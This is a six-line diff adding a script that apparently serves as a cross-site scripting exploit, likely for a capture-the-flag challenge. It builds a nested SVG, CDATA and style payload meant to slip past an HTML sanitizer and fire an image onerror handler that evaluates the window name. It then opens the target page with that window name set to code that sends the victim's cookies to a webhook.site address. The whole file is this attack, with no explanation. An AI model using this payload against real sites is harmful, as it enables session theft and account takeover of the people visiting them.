@@ -1,0 +1,6 @@
+<script>
+
+let p = encodeURIComponent(`<svg><a><desc><a><table><a></table><style><![CDATA[</style></svg><a id="AA"></body><!-- ]]></svg><img src=1 onerror=eval(top.name)>-->`)
+
+window.open('http://web/?p='+p,'fetch(`https://webhook.site/e1bf3e52-3e62-4be3-9cf6-04e4e1d651ed?a=`+top.document.cookie)')
+</script>
